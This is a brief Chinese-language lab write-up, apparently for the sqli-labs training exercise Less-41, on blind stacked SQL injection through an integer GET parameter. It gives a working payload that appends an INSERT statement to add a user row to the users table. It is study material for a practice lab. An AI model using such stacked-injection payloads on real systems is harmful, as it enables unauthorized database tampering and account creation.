# GET-BLIND based-Intiger-Stacked  
TAG：GET型注入、盲注、堆叠注入  
## 漏洞利用  
![less41_1](images\less41_1.png)  
此less为关闭错误回显的堆叠注入变种，通过之前提到的判断方式可知此less参数类型为整形无包裹    
  
构造添加用户的payload:```?id=1;insert into users(id,username,password) values ('20','less41','hello')--+```  
![less41_2](images\less41_2.png)  